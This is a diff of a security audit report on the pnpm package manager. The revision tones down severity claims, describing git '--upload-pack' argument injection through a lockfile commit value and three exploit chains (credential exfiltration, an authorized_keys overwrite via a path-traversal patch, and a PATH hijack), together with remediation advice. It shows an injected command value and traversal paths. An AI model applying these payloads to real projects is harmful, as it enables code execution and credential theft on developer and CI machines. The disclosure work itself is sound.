+The git fetcher at `fetching/git-fetcher/src/index.ts:33` passes `resolution.commit` from the lockfile directly to `git fetch` as a positional argument without a `--` separator. Git parses all arguments before `--` as options. If `resolution.commit` is `--upload-pack=<command>`, git treats it as the `--upload-pack` option, which specifies the program to invoke as the upload-pack binary on the remote side. For `file://` and SSH transports, git shells out the specified command. The command executes before git determines that the specified program is not a valid upload-pack binary, causing the fetch to fail -- but the injected command has already run.
 
 ```typescript
 // fetching/git-fetcher/src/index.ts:30-33 (vulnerable path)
@@ -780,19 +579,15 @@ if (allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)) {
 }
 ```
 
-The shallow fetch path (line 30) is taken when the repo's URL host matches a value in `gitShallowHosts`. The default `gitShallowHosts` list (from `config/reader/src/index.ts:155-162`) includes `github.com`, `gist.github.com`, `gitlab.com`, `bitbucket.com`, and `bitbucket.org`. Any project with a git dependency hosted on these platforms is vulnerable without any additional configuration. The `lockfile/types/src/index.ts` `GitRepositoryResolution` type declares `commit: string` with no format constraint, so pnpm performs no validation of the commit value before passing it to git.
-
-> **PoC note:** The exploit uses `file://githost/...` as the repo URL with `pnpm_config_git_shallow_hosts='["githost"]'` environment variable because `--upload-pack` injection requires a local or SSH transport (HTTPS transport ignores `--upload-pack`). Note: `git-shallow-hosts` cannot be set via `.npmrc` — pnpm's `isNpmrcReadableKey()` filter only allows auth/registry/network keys. In real-world attacks, the victim's project would use an SSH-transported git dependency (`git+ssh://git@github.com/...`), and `github.com` is in the default `gitShallowHosts` — no env var override is required.
-
-> **URL normalization note:** Node's `URL` class normalizes `localhost` to empty string for the `file:` protocol (`new URL('file://localhost/path').host === ""`), so `githost` (an arbitrary non-`localhost` hostname) is used instead. git resolves `file://githost/path` as a local path correctly.
+The shallow fetch path (line 30) is taken when the repo's URL host matches a value in `gitShallowHosts`. The default `gitShallowHosts` list includes `github.com`, `gist.github.com`, `gitlab.com`, `bitbucket.com`, and `bitbucket.org`.
 
 ### Attack Scenario
 
-1. Attacker gains write access to the project's `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine, or direct repo access).
-2. Attacker locates any git dependency whose `resolution.repo` host is in `gitShallowHosts` (e.g., any `github.com` dependency with SSH transport).
-3. Attacker replaces the 40-char hex `commit:` value in the lockfile with `'--upload-pack=<malicious command>'`.
-4. Victim runs `pnpm install`. The shallow fetch path is taken (because `github.com` is in default `gitShallowHosts`), and git executes the injected command during `git fetch --depth 1 origin '--upload-pack=<malicious command>'`.
-5. The fetch fails (injected command is not a valid upload-pack binary), but the command has already executed as the user running `pnpm install`.
+1. Attacker gains write access to the project's `pnpm-lock.yaml`.
+2. Attacker locates a git dependency whose `resolution.repo` host is in `gitShallowHosts` and uses SSH transport (e.g., `git+ssh://git@github.com/...`).
+3. Attacker replaces the 40-char hex `commit:` value with `'--upload-pack=<malicious command>'`.
+4. Victim runs `pnpm install`. The shallow fetch path is taken, and git executes the injected command during `git fetch --depth 1 origin '--upload-pack=<malicious command>'`.
+5. The fetch fails, but the command has already executed.
 
 ### Proof of Concept
 
@@ -801,121 +596,127 @@ bash autofyn_audit/exploits/vuln11_git_upload_pack_rce/exploit.sh
 # Expected: PASS -- /tmp/vuln11_pwned created by injected touch command
 ```
 
-The exploit creates a local bare git repo, installs it as a git dependency with `file://githost/...` URL and `pnpm_config_git_shallow_hosts='["githost"]'` env var to trigger the shallow fetch path. After generating a valid lockfile, it uses python3 regex to replace the 40-char hex commit hash with `'--upload-pack=touch /tmp/vuln11_pwned'` in YAML single-quote notation. After clearing the store and re-running install with `--frozen-lockfile`, the marker file `/tmp/vuln11_pwned` is created by the injected `touch` command before git reports a fetch failure.
+The exploit creates a local bare git repo, installs it as a git dependency with `file://githost/...` URL and `pnpm_config_git_shallow_hosts='["githost"]'` env var to trigger the shallow fetch path. After generating a valid lockfile, it replaces the 40-char hex commit hash with `'--upload-pack=touch /tmp/vuln11_pwned'`. After clearing the store and re-running install, the marker file is created by the injected `touch` command.
+
+> **PoC note:** The exploit uses `file://githost/...` as the repo URL because `--upload-pack` injection requires a local or SSH transport. HTTPS transport ignores `--upload-pack`. In real-world attacks, the victim's project would need an SSH-transported git dependency (`git+ssh://git@github.com/...`). While `github.com` is in the default `gitShallowHosts`, most GitHub dependencies use HTTPS URLs, not SSH.
 
 ### Impact
 
-Remote code execution as the user running `pnpm install`. Any project with a git dependency on `github.com`, `gitlab.com`, or `bitbucket.org` using SSH transport is vulnerable by default — no extra configuration is required. An attacker who can modify the lockfile can execute arbitrary commands on every machine and CI/CD runner that installs the project. The RCE occurs before pnpm's post-checkout integrity check at line 38-41 (`receivedCommit !== resolution.commit`), so the check never runs to detect the tampered value. The scope is changed (S:C) because the RCE escapes the npm lifecycle sandbox — `git` is invoked directly by pnpm's fetcher, not through a postinstall script, so no sandbox applies.
+Argument injection that can achieve code execution under specific conditions: the git dependency must use SSH or local transport (not HTTPS), and the repo host must be in `gitShallowHosts`. For dependencies using HTTPS URLs (the common case for GitHub), `--upload-pack` is ignored by git and the injection has no effect.
+
+### Caveats
+
+- **HTTPS transport is immune.** The `--upload-pack` flag is ignored when git uses the HTTPS transport, which is the default for most GitHub/GitLab/Bitbucket dependencies. The attack only works with SSH (`git+ssh://`) or local (`file://`) transports.
+- **SSH git dependencies are uncommon in open-source projects.** Most open-source projects reference git dependencies via HTTPS URLs. SSH URLs are more common in private/enterprise projects, narrowing the attack surface.
+- **Requires lockfile modification.** As with other lockfile-based attacks, the attacker must have write access to `pnpm-lock.yaml`.
+- **npm and yarn also lack `--` separators in git fetch commands.** This class of argument injection applies to other package managers as well.
 
 ### Remediation
 
-1. **Add `--` separator before `resolution.commit`:** Change `execGit(['fetch', '--depth', '1', 'origin', resolution.commit])` to `execGit(['fetch', '--depth', '1', 'origin', '--', resolution.commit])` and `execGit(['checkout', resolution.commit])` to `execGit(['checkout', '--', resolution.commit])`. This prevents git from interpreting the commit value as an option.
-2. **Validate commit format:** Before passing to git, assert that `resolution.commit` matches `/^[0-9a-f]{40}$/`. Reject any value that is not a valid 40-char hex SHA1. This is a strict input validation that eliminates the attack surface entirely.
-3. **Apply validation at the lockfile reader level:** `lockfile/types/src/index.ts` should enforce the commit format constraint at the type level (e.g., with a branded type or a runtime validation step) so that malformed commit values are rejected before they reach the fetcher.
+1. **Add `--` separator before `resolution.commit`:** Change `execGit(['fetch', '--depth', '1', 'origin', resolution.commit])` to `execGit(['fetch', '--depth', '1', 'origin', '--', resolution.commit])` and similarly for `execGit(['checkout', resolution.commit])`. This prevents git from interpreting the commit value as an option.
+2. **Validate commit format:** Before passing to git, assert that `resolution.commit` matches `/^[0-9a-f]{40}$/`. Reject any value that is not a valid 40-char hex SHA1. This eliminates the attack surface entirely.
+3. **Apply validation at the lockfile reader level:** `lockfile/types/src/index.ts` should enforce the commit format constraint so that malformed commit values are rejected before they reach the fetcher.
 
 ---
 
 ## Exploit Chains
 
-The following chains combine independently confirmed vulnerabilities into end-to-end attack scenarios. Each chain demonstrates a complete attack from a single `pnpm install` to a critical outcome, leaving no room for "this is just a hypothetical code path" dismissal.
+The following chains combine independently confirmed vulnerabilities into end-to-end attack scenarios. Each chain has a working proof-of-concept that executes a complete attack from a single `pnpm install`.
 
 ---
 
-### CHAIN-1: Lockfile Poisoning → Credential Theft Pipeline
+### CHAIN-1: Lockfile Poisoning to Credential Theft Pipeline
 
-**Vulnerabilities chained:** VULN-1 (Integrity Check Bypass) + VULN-9 (Directory Path Traversal)
-**Impact:** Complete credential theft — SSH private keys and cloud credentials exfiltrated to attacker server — from a single lockfile modification
+**Vulnerabilities chained:** VULN-1 (Integrity Check Bypass) + VULN-6 (Lockfile Resolution Path Traversal -- Directory Fetcher)  
+**Impact:** Credential theft -- SSH private keys and cloud credentials read from disk and exfiltrated via a tampered package's postinstall  
 **PoC:** `exploits/chain1_lockfile_credential_theft/exploit.sh`
 
 #### Attack Narrative
 
-An attacker who can modify a project's `pnpm-lock.yaml` makes two changes, each individually a confirmed vulnerability:
+An attacker who can modify a project's `pnpm-lock.yaml` and `package.json` makes two changes, each individually a confirmed vulnerability:
 
-1. **VULN-9 — Directory traversal redirect:** The resolution for package `chain1-data` is changed from a registry tarball to a directory type with a path traversal: `{directory: ../../../../../../tmp/chain1_secrets, type: directory}`. The lockfile's `packages:` and `snapshots:` entry keys and the `importers:` version reference are updated to match. When pnpm installs, the directory fetcher at `directory-fetcher/src/index.ts:30` resolves `resolution.directory` against the project root without any bounds check, reads all files from the victim's secrets directory (`id_rsa`, `credentials.json`), and hardlinks them into `node_modules/chain1-data/`.
+1. **VULN-6 -- Directory traversal redirect:** The resolution for package `chain1-data` is changed from a registry tarball to a directory type with a path traversal: `{directory: ../../../../../../tmp/chain1_secrets, type: directory}`. The lockfile's `packages:` and `snapshots:` entry keys and the `importers:` version reference are updated to match. When pnpm installs, the directory fetcher at `directory-fetcher/src/index.ts:30` resolves `resolution.directory` against the project root without any bounds check, reads all files from the victim's secrets directory (`id_rsa`, `credentials.json`), and hardlinks them into `node_modules/chain1-data/`.
 
-2. **VULN-1 — Integrity removal on a tampered package:** The resolution for package `chain1-exfil` has its `integrity:` field stripped, leaving only the `tarball:` URL pointing at the registry. The attacker has meanwhile unpublished and republished `chain1-exfil@1.0.0` with a malicious `postinstall` script (`exfil.js`). With `integrity: undefined`, the worker at `worker/src/start.ts:190` skips hash verification and installs the tampered package silently.
+2. **VULN-1 -- Integrity removal on a tampered package:** The resolution for package `chain1-exfil` has its `integrity:` field stripped, leaving only the `tarball:` URL pointing at the registry. The attacker has meanwhile unpublished and republished `chain1-exfil@1.0.0` with a malicious `postinstall` script (`exfil.js`). With `integrity: undefined`, the worker at `worker/src/start.ts:190` skips hash verification and installs the tampered package silently.
 
-3. **Exfiltration:** The `postinstall` in the tampered `chain1-exfil` package uses `process.env.INIT_CWD` (set by pnpm to the project root for all lifecycle scripts) to locate `node_modules/chain1-data/` — which now contains the stolen secrets from step 1. It reads `id_rsa` and `credentials.json` and sends them via HTTP POST to an attacker-controlled capture server.
+3. **Exfiltration:** The `postinstall` in the tampered `chain1-exfil` package uses `process.env.INIT_CWD` to locate `node_modules/chain1-data/` -- which now contains the stolen secrets from step 1. It reads `id_rsa` and `credentials.json` and sends them via HTTP POST to an attacker-controlled capture server.
 
-The victim runs a single `pnpm install`. No error is shown. SSH keys and cloud credentials are exfiltrated silently. The attack is invisible to CI/CD monitoring because `pnpm install` exits with status 0.
-
-The project explicitly allowlists `chain1-exfil` in `allowBuilds` — a realistic scenario where a developer trusts a known dependency. This makes the chain realistic: the attacker does not need to bypass policy, only poison the lockfile.
+The victim runs a single `pnpm install`. No error is shown. The attack requires modifying both `pnpm-lock.yaml` and `package.json`, plus controlling the registry to serve a tampered exfiltration package.
 
 #### Component Vulnerabilities
 
-- **VULN-1** (Critical, 8.7): Tampered package installs without integrity check when the `integrity:` field is removed from the lockfile resolution.
-- **VULN-9** (High, 7.1): Directory fetcher resolves `resolution.directory` from the lockfile without bounds checking, reading arbitrary directories into `node_modules/`.
+- **VULN-1** (High, 7.5): Tampered package installs without integrity check when the `integrity:` field is removed from the lockfile resolution.
+- **VULN-6** (Medium, 4.5): Directory fetcher resolves `resolution.directory` from the lockfile without bounds checking, reading arbitrary directories into `node_modules/`.
 
 #### Combined Impact
 
-**Critical.** A single lockfile commit (feasible via PR, compromised CI, or lockfile drift) achieves complete credential theft. The lockfile modification is subtle: changing `resolution:` entries looks superficially similar to normal version upgrades. Standard code review is unlikely to catch the traversal path or the missing `integrity:` field without specific security tooling.
+Credential theft from a single `pnpm install`. The attack requires lockfile + `package.json` modification (feasible via PR or compromised CI) plus a registry-side package substitution. The lockfile modification is subtle: changing `resolution:` entries looks superficially similar to normal version changes. Standard code review may not catch the traversal path or the missing `integrity:` field without specific security tooling.
 
 ---
 
 ### CHAIN-2: Patch File SSH Backdoor
 
-**Vulnerabilities chained:** VULN-7 (Arbitrary File Delete via Patch) + VULN-6 (Arbitrary File Write via Patch)
-**Impact:** Persistent unauthorized SSH access — victim's `authorized_keys` replaced with attacker's public key — from a single `pnpm install`
+**Vulnerability:** VULN-5 (Arbitrary File Write/Delete via Patch -- both write and delete variants)  
+**Impact:** SSH authorized_keys replaced with attacker's public key via a single malicious patch file  
 **PoC:** `exploits/chain2_patch_ssh_backdoor/exploit.sh`
 
 #### Attack Narrative
 
-An attacker who can contribute a `.patch` file to a project creates a single patch file with **two diff blocks**. The patch is committed alongside a `pnpm-workspace.yaml` `patchedDependencies` entry. A single `pnpm install` permanently backdoors the developer's SSH access:
+An attacker who can contribute a `.patch` file to a project creates a single patch file with two diff blocks. The patch is committed alongside a `pnpm-workspace.yaml` `patchedDependencies` entry. A single `pnpm install` replaces the developer's SSH authorized_keys:
 
-1. **VULN-7 — Delete existing authorized_keys:** The first diff block uses `deleted file mode 100644` with a path that traverses out of the package directory using 10 `../` segments: `../../../../../../../../../../tmp/chain2_home/.ssh/authorized_keys`. The `executeEffects` function in `apply.js` calls `fs.unlinkSync(eff.path)` with this unsanitized path, deleting the victim's SSH `authorized_keys` file. The `// TODO: integrity checks` comment in the source confirms the authors were aware validation was absent.
+1. **VULN-5 delete variant -- Delete existing authorized_keys:** The first diff block uses `deleted file mode 100644` with a path that traverses out of the package directory using 10 `../` segments: `../../../../../../../../../../tmp/chain2_home/.ssh/authorized_keys`. The `executeEffects` function in `apply.js` calls `fs.unlinkSync(eff.path)` with this unsanitized path, deleting the victim's SSH `authorized_keys` file.
 
-2. **VULN-6 — Write attacker's key:** The second diff block uses `new file mode 100644` targeting the same path. The `executeEffects` function calls `fs.ensureDirSync(dirname(eff.path))` then `fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })` with the attacker's SSH public key as content. Since the patch parser processes effects in the order they appear (`forEach`), the deletion runs first, then the creation — resulting in a clean replacement.
+2. **VULN-5 write variant -- Write attacker's key:** The second diff block uses `new file mode 100644` targeting the same path. The `executeEffects` function calls `fs.ensureDirSync(dirname(eff.path))` then `fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })` with the attacker's SSH public key as content. Since the patch parser processes effects in order, the deletion runs first, then the creation -- resulting in a clean replacement.
 
-The victim runs `pnpm install` to pick up a dependency update. No error is shown. Their `authorized_keys` now contains only the attacker's key. The attacker can immediately SSH into the developer's machine or CI runner.
-
-The attack requires only the ability to contribute a `.patch` file and update `pnpm-workspace.yaml` — both are routine in open-source contribution workflows (pull requests). No special privileges are needed beyond write access to the repository.
+The victim runs `pnpm install` to pick up a dependency update. No error is shown. Their `authorized_keys` now contains only the attacker's key.
 
 #### Component Vulnerabilities
 
-- **VULN-7** (High, 7.3): `fs.unlinkSync` is called with an unsanitized path from the patch `diff --git a/` header, enabling arbitrary file deletion.
-- **VULN-6** (High, 7.3): `fs.writeFileSync` is called with an unsanitized path from the patch `+++ b/` header, enabling arbitrary file write with attacker-controlled content.
+- **VULN-5** (Medium, 5.5): Both the file deletion (`fs.unlinkSync`) and file creation (`fs.writeFileSync`) effects use unsanitized paths from patch `diff --git` headers, enabling arbitrary file write and delete via path traversal.
 
 #### Combined Impact
 
-**Critical.** A single patch file contributed via PR achieves persistent SSH access to any machine that runs `pnpm install`. The patch file looks like a normal dependency fix — the traversal paths in `diff --git` headers are not commonly reviewed for security. After `pnpm install`, the attacker has persistent access to the developer machine and any CI/CD runners that installed the project, surviving reboots and re-deploys. Revocation requires the victim to notice the unauthorized key and manually rotate `authorized_keys`, which may not happen until a breach is detected.
+Persistent SSH access to any machine that runs `pnpm install` with the malicious patch. The attack requires repository commit access to contribute the `.patch` file and modify `pnpm-workspace.yaml`. As noted in the VULN-5 caveats, an attacker with commit access could achieve similar outcomes through other means (e.g., malicious postinstall scripts), so this chain demonstrates the path traversal gap rather than a uniquely enabled attack.
 
 ---
 
-### CHAIN-3: Security Policy Bypass -> PATH Hijack -> Silent Credential Theft
+### CHAIN-3: Security Policy Bypass to PATH Hijack to Credential Theft
 
-**Vulnerabilities chained:** VULN-5 (Bin Linking Bypasses allowBuild Policy) + VULN-9 (Lockfile resolution.directory Path Traversal)
-**Impact:** Credential theft despite the developer explicitly blocking the untrusted package — `allowBuilds` provides false security confidence while both vectors remain active
+**Vulnerabilities chained:** VULN-4 (Bin Linking Bypasses allowBuild Policy) + VULN-6 (Lockfile Resolution Path Traversal -- Directory Fetcher)  
+**Impact:** Credential theft despite the developer explicitly blocking the untrusted package -- `allowBuilds` provides incomplete protection while both vectors remain active  
 **PoC:** `exploits/chain3_policy_bypass_theft/exploit.sh`
 
 #### Attack Narrative
 
-A developer discovers a suspicious transitive dependency (`chain3-shadow`) pulled in by `chain3-runner`. They do the right thing: they add `allowBuilds: {chain3-shadow: false}` to `pnpm-workspace.yaml` to block its lifecycle scripts, while keeping `chain3-runner: true` since it's a trusted package. An attacker who can modify the project's `pnpm-lock.yaml` exploits two independent vulnerabilities to steal credentials anyway — in a single `pnpm install`:
+A developer discovers a suspicious transitive dependency (`chain3-shadow`) pulled in by `chain3-runner`. They add `allowBuilds: {chain3-shadow: false}` to `pnpm-workspace.yaml` to block its lifecycle scripts, while keeping `chain3-runner: true` since it is a trusted package. An attacker who can modify the project's `pnpm-lock.yaml` and `package.json` exploits two independent vulnerabilities:
 
-1. **Developer explicitly blocks chain3-shadow:** The developer adds `allowBuilds: {chain3-shadow: false}` to `pnpm-workspace.yaml`. This correctly prevents chain3-shadow's `postinstall` script from running. The developer believes the threat is neutralized.
+1. **Developer explicitly blocks chain3-shadow:** The developer adds `allowBuilds: {chain3-shadow: false}` to `pnpm-workspace.yaml`. This correctly prevents chain3-shadow's `postinstall` script from running.
 
-2. **VULN-5 — Bin entries bypass the allowBuilds block via internal linking order:** Despite the block, chain3-shadow declares `"bin": {"node": "./payload.sh"}` in its `package.json`. In `building/during-install/src/index.ts`, `linkBinsOfDependencies()` (line 176) executes unconditionally BEFORE `runPostinstallHooks()` (line 187), and the `ignoreScripts` flag set by `allowBuilds: false` (line 98) only gates the postinstall — not bin linking. When pnpm builds chain3-runner, it first links chain3-shadow's bin entries into chain3-runner's virtual store `node_modules/.bin/` directory (`node_modules/.pnpm/chain3-runner@1.0.0/node_modules/chain3-runner/node_modules/.bin/node`), then runs chain3-runner's postinstall. The malicious `node` binary is on PATH before any lifecycle script executes.
+2. **VULN-4 -- Bin entries bypass the allowBuilds block:** Despite the block, chain3-shadow declares `"bin": {"node": "./payload.sh"}` in its `package.json`. In `building/during-install/src/index.ts`, `linkBinsOfDependencies()` (line 176) executes unconditionally BEFORE `runPostinstallHooks()` (line 187), and the `ignoreScripts` flag set by `allowBuilds: false` only gates the postinstall -- not bin linking. The malicious `node` binary is linked into chain3-runner's virtual store `node_modules/.bin/` before any lifecycle script executes.
 
-3. **VULN-9 — Lockfile tampers chain3-secrets resolution to read secrets from disk:** The lockfile's `resolution:` entry for `chain3-secrets` is changed from a registry tarball to a directory type: `{directory: ../../../../../../tmp/chain3_target_secrets, type: directory}`. The `packages:`, `snapshots:`, and `importers:` entries are updated to match. When pnpm installs, the directory fetcher at `directory-fetcher/src/index.ts:30` resolves `resolution.directory` without any bounds check, reads all files from the victim's secrets directory (`secret_key.pem`, `credentials.json`) into the content-addressable store, and hardlinks them into `node_modules/chain3-secrets/`.
+3. **VULN-6 -- Lockfile tampers chain3-secrets resolution to read secrets from disk:** The lockfile's `resolution:` entry for `chain3-secrets` is changed from a registry tarball to a directory type: `{directory: ../../../../../../tmp/chain3_target_secrets, type: directory}`. When pnpm installs, the directory fetcher reads all files from the victim's secrets directory into `node_modules/chain3-secrets/`.
 
-4. **Execution — trusted package's postinstall triggers the attack:** `chain3-runner` is explicitly allowed via `allowBuilds: {chain3-runner: true}` and has `"postinstall": "node -e \"console.log('chain3-runner setup complete')\""`. When pnpm executes this lifecycle script, `extendPath` prepends the virtual store's `node_modules/.bin/` to PATH. The `node` command resolves to chain3-shadow's `payload.sh` (linked there in step 2). The payload reads `secret_key.pem` and `credentials.json` from `$INIT_CWD/node_modules/chain3-secrets/` and copies them to `/tmp/chain3_exfiltrated/`, then `exec`s the real `node` binary so chain3-runner's postinstall completes normally. The attack is invisible: `pnpm install` exits 0, chain3-runner logs "chain3-runner setup complete", and no error appears.
-
-The victim ran a single `pnpm install` after doing everything a security-conscious developer is advised to do. SSH keys and cloud credentials are stolen silently. The `allowBuilds` block gave the developer false confidence that the threat was contained.
+4. **Execution -- trusted package's postinstall triggers the attack:** `chain3-runner` is explicitly allowed and has a postinstall that invokes `node`. The `extendPath` function prepends the virtual store's `node_modules/.bin/` to PATH. The `node` command resolves to chain3-shadow's `payload.sh` (linked in step 2). The payload reads secrets from `node_modules/chain3-secrets/` and copies them to an exfiltration location, then `exec`s the real `node` binary so chain3-runner's postinstall completes normally. The attack is not visible in the install output.
 
 #### Component Vulnerabilities
 
-- **VULN-5** (Medium, 6.3): In `building/during-install/src/index.ts`, `linkBinsOfDependencies()` at line 176 runs unconditionally before the `ignoreScripts` check at line 187. When a package is blocked by `allowBuilds`, its lifecycle scripts are correctly skipped — but its bin entries are still linked into the parent package's virtual store `node_modules/.bin/`. A blocked transitive dependency can inject arbitrary executables onto its parent's PATH.
-- **VULN-9** (High, 7.1): `directory-fetcher/src/index.ts:30` resolves `resolution.directory` from the lockfile via `path.resolve` with no containment check. An attacker who can modify the lockfile can redirect any package installation to read arbitrary directories from the filesystem into `node_modules/`.
+- **VULN-4** (Medium, 6.3): `linkBinsOfDependencies()` runs unconditionally before the `ignoreScripts` check. A blocked package's bin entries are still linked into its parent's PATH.
+- **VULN-6** (Medium, 4.5): `directory-fetcher/src/index.ts:30` resolves `resolution.directory` from the lockfile via `path.resolve` with no containment check.
 
 #### Combined Impact
 
-**Critical.** The developer did everything right — identified the suspicious transitive dependency, used `allowBuilds` to block it, and explicitly allowed only the trusted parent package's lifecycle. The policy is incomplete at a precise point: `linkBinsOfDependencies()` runs before `runPostinstallHooks()` without checking the `ignoreScripts` flag (VULN-5), and the lockfile enables loading secrets from disk without any path validation (VULN-9). The attack requires only lockfile control (feasible via PR, compromised CI, or supply chain compromise) and relies on the developer's own security decision (`allowBuilds`) to create the false confidence that makes the attack viable. Standard code review is unlikely to catch the traversal path in `resolution.directory` entries or notice that a blocked transitive dependency's `bin` entries are linked before its parent's postinstall runs.
+Credential theft despite the developer following the recommended security practice of blocking the suspicious package via `allowBuilds`. The attack requires lockfile + `package.json` control and relies on the `allowBuilds` policy gap (bin linking not gated by `ignoreScripts`) combined with the directory fetcher path traversal. The developer's explicit security decision creates a false sense of containment.
 
 ---
 
 ## Conclusion
 
-All eleven vulnerabilities are confirmed and independently reproducible against pnpm v11.2.2 at commit 976504f. VULN-1 is the most severe, as it silently undermines the supply chain trust model that `--frozen-lockfile` is meant to provide. VULN-2 and VULN-3 enable credential theft through common supply chain attack patterns. VULN-4 demonstrates a defense-in-depth gap where pnpm delegates all protocol validation to git rather than validating lockfile inputs itself. VULN-5 reveals that the `allowBuilds` security policy is incomplete: it blocks lifecycle scripts but allows bin entries to be linked, enabling PATH hijacking from a package the operator believed was fully contained. VULN-6 and VULN-7 expose the patch application pipeline as a path traversal vector: a malicious `.patch` file committed to a project can write to or delete arbitrary files on the filesystem during `pnpm install`, with no path validation anywhere in the pipeline. VULN-8 demonstrates that pnpm's lifecycle environment sanitization has a case-sensitivity gap: uppercase `NPM_CONFIG_*` variables pass through unfiltered, enabling npm config injection in any environment where an attacker can set process-level environment variables. VULN-9 demonstrates that the directory fetcher resolves `resolution.directory` from the lockfile without any bounds check, allowing an attacker who can modify the lockfile to redirect a package resolution to an arbitrary directory on the filesystem, reading all files in that directory into the content-addressable store and hardlinking them into `node_modules/`. VULN-10 is a parallel path traversal in the local tarball fetcher: `resolution.tarball` with a `file:` prefix is resolved without containment checks, allowing an attacker who tampers the lockfile to redirect a package installation to read any accessible `.tgz` file on disk. VULN-11 demonstrates that `resolution.commit` is passed to `git fetch` without a `--` separator, enabling `--upload-pack` argument injection that achieves code execution on the machine running `pnpm install` when the repo host is in `gitShallowHosts` — which by default includes `github.com`, `gitlab.com`, and `bitbucket.org`, covering the majority of real-world git dependencies.
+All seven vulnerabilities are confirmed and independently reproducible against pnpm v11.2.2 at commit 976504f.
 
-Beyond the individual vulnerabilities, three end-to-end exploit chains confirm that multiple findings are not isolated weaknesses but components of complete attack scenarios. CHAIN-1 combines VULN-1 and VULN-9 to achieve silent credential theft from a single lockfile modification: the directory traversal reads SSH keys and cloud credentials into `node_modules/`, and integrity bypass allows a tampered package's postinstall script to exfiltrate them to an attacker-controlled server — all in a single `pnpm install` with no error output. CHAIN-2 combines VULN-7 and VULN-6 to achieve persistent SSH backdoor access: a single malicious patch file deletes the victim's SSH `authorized_keys` and replaces it with the attacker's public key, granting permanent remote access to any machine that ran `pnpm install`. CHAIN-3 combines VULN-5 and VULN-9 to demonstrate that the `allowBuilds` security policy provides false confidence: a developer who explicitly blocks a suspicious transitive dependency still loses credentials because `linkBinsOfDependencies()` runs unconditionally before `runPostinstallHooks()` (VULN-5), linking the blocked package's `node` bin into its parent's PATH, and a lockfile-tampered dependency loads secrets from disk (VULN-9). When the allowed parent's postinstall invokes `node`, it executes the blocked dependency's payload — stealing credentials while the developer believes the threat is neutralized. These chains demonstrate that individual vulnerabilities, even if individually assessed as "high" rather than "critical," compound into critical-severity attacks when chained. Defenders cannot triage them in isolation.
+VULN-1 is the most actionable finding: it allows `pnpm install --frozen-lockfile` to silently install tampered packages when the lockfile integrity field is absent, a gap that npm's `npm ci` does not have. VULN-2 is a straightforward code fix (compare origin, not just host) that prevents auth token leakage on protocol-downgrade redirects, though it requires a MITM position to exploit. VULN-3 is a low-severity defense-in-depth gap where pnpm delegates all git protocol validation to git itself rather than validating lockfile-provided URLs. VULN-4 reveals an incomplete implementation in the `allowBuilds` security policy: lifecycle scripts are blocked but bin linking is not, enabling PATH shadowing from a supposedly contained package. VULN-5 exposes the patch application pipeline to path traversal, though the threat model is weakened by the fact that an attacker with commit access to contribute patch files can often achieve equivalent damage through other means. VULN-6 shows that both the directory fetcher and local tarball fetcher trust lockfile-provided paths without containment checks, though exploitation requires modifying both the lockfile and `package.json` -- a circular threat model since `package.json` changes can achieve the same outcome directly. VULN-7 demonstrates argument injection in git fetch via `resolution.commit`, but the practical impact is limited because HTTPS transport (the common case) ignores the injected `--upload-pack` flag.
 
-Recommended remediation priority: VULN-1 > VULN-11 > VULN-6 > VULN-7 > VULN-9 > VULN-10 > VULN-4 > VULN-5 > VULN-2 > VULN-3 > VULN-8.
+A recurring theme across findings VULN-3, VULN-5, VULN-6, and VULN-7 is that the attacker must already have a significant level of access (lockfile modification, repository commit access) that often enables equivalent damage through other vectors. These findings represent defense-in-depth improvements: pnpm should validate its inputs regardless of the trust model upstream, but the incremental security benefit should be weighed honestly against the preconditions required.
+
+Three exploit chains confirm that individual findings combine into multi-step attack scenarios. CHAIN-1 combines VULN-1 and VULN-6 for credential theft via lockfile poisoning. CHAIN-2 uses both variants of VULN-5 (write and delete) to replace SSH authorized_keys via a malicious patch file. CHAIN-3 combines VULN-4 and VULN-6 to steal credentials despite an explicit `allowBuilds` block.
+
+Recommended remediation priority: VULN-1 > VULN-4 > VULN-7 > VULN-5 > VULN-6 > VULN-2 > VULN-3.
